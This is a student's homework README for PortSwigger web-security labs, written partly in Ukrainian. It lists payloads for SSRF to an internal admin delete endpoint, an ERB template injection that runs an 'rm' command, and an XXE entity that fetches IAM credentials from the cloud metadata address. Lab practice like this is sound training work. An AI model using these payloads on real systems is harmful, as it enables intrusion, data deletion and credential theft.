# cybersecurity_homework11
Attacks on the server

Зробіть наступні лабораторні роботи.

1)(https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost) 
Відповідь : https://github.com/redbersdev/cybersecurity_homework11/blob/main/photo_2023-07-07_23-27-28.jpg

2)(https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
Відповідь : https://github.com/redbersdev/cybersecurity_homework11/blob/main/photo_2023-07-07_23-28-29.jpg 
( payload : http:192.168.0.251:8080/admin/delete?username=carlos)

3)(https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
Відповідь : https://github.com/redbersdev/cybersecurity_homework11/blob/main/photo_2023-07-07_23-28-36.jpg  
( payload: <%=+system("rm+/home/carlos/morale.txt")+%> )

Обов'язково разом зі скріншотом виконаної лабораторної надсилайте пейлоад або послідовність дій, які привели до успішної компроментації.

4) (https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf )
Відповідь : https://github.com/redbersdev/cybersecurity_homework11/blob/main/photo_2023-07-07_23-28-43.jpg
payload: ( <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE random [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>)

